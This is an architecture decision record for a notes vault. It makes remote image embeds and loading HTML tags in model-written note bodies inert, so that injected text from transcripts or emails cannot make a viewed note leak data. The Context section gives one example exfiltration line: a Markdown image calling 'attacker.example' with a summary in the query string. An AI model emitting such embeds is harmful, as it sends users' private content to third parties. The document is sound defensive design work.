# 0022. Remote embeds in note bodies become links

Status: accepted
Date: 2026-11-10
Related: docs/adr/0008-vault-safety.md, issue 135

## Context
Notes are written by models that read untrusted text (meeting transcripts, emails). A body can
then hold an image that Obsidian loads from the network as soon as the note is viewed, for
example `![](https://attacker.example/x.png?d=<summary>)` or `<img src="https://...">`. Loading
it sends the URL, and whatever the model put in it, to that host.

## Decision
Every body written through `src/vault/` (create, append, recipes, conflict copies) passes
`neutralizeRemoteEmbeds` (`src/vault/embeds.ts`) after the secret scrub:

- A Markdown image whose destination could leave the vault loses its `!` and becomes the link
  `[alt](url ...)`: still visible, loaded only on a click. A `!` right before it is escaped.
- A reference image (`![a][r]`, `![a][]`, `![a]`) loses its `!` when its label has a remote
  definition. On an append, a new remote definition for a label an image of the stored body uses
  gets a backslash (`\[r]: ...`): it stays visible and defines nothing.
- An HTML start tag with a loading attribute (`src`, `srcset`, `poster`, `data`, `background`,
  `lowsrc`, `dynsrc`, `srcdoc`, a `style` that can load) holding a remote value, and every
  `<style`, `<link`, `<base`, `<meta` and `<svg` tag, gets its `<` written as `&lt;`: the tag
  shows as text. Attributes are read the way a browser tokenizer reads them, with blockquote
  markers after a line break skipped.
- "Remote" is anything but a plain vault path: any scheme, `//host`, or an `&` or `\` before the
  scheme is settled.
- Local embeds, `![[note]]`, wikilinks and plain links are not touched; frontmatter is not
  touched.
- The count is reported like a secret redaction, as rule `remote_embed` in `redactions` and in
  the `redacted:` log line.
- An append that would give a tag left open at the end of the stored body a remote attribute is
  refused with `scrub_failed` (stored bytes never change, so the open tag cannot be fixed).

Meeting transcripts from the meeting flow are stored verbatim: they are not neutralized, and a
conflict copy of a note whose type is `immutable_body` keeps its body. Fireflies and Gemini text
does not produce Markdown images, and a static transcript cannot carry what a model later writes;
a note any caller creates through `POST /notes` or `save_note` is neutralized whatever its type,
so declaring a transcript type does not skip it.

Code blocks and code spans are neutralized like prose. Telling them apart needs a full Markdown
parser with container rules; a wrong guess would keep a live embed. The cost is that a code
sample with a remote image shows the link form or `&lt;`.

## Consequences
- Positive: a viewed note never fetches a remote resource it was given by a model.
- Negative: code samples with remote images are changed; `<svg>`, `<style>` and `<link>` written
  in a note show as text; a remote reference image with a local definition elsewhere loses its
  embed.
- Not covered: bodies stored before this change, frontmatter values read by Obsidian plugins
  (for example banner images), and a transcript's own embeds.
